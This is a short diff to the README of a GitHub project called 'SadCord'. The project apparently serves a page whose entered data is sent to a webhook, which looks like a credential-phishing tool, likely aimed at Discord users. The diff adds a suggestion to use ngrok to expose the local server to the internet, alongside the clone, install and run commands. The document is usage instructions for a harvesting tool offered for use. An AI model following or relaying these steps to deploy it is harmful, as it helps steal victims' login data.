@@ -4,7 +4,11 @@ and it sends the data entered to a webhook
 # How to use 
 `git clone https://github.com/Zeleph-Dev/SadCord.git`
 
-`pip3 install -r requirements.txt` or `pip3 install colorama`
+`pip3 install -r requirements.txt` 
+
+if you want put local server on internet you can use ngrok
+
+https://ngrok.com/download
 
 `python3 SadCord.py`
 # Pictures
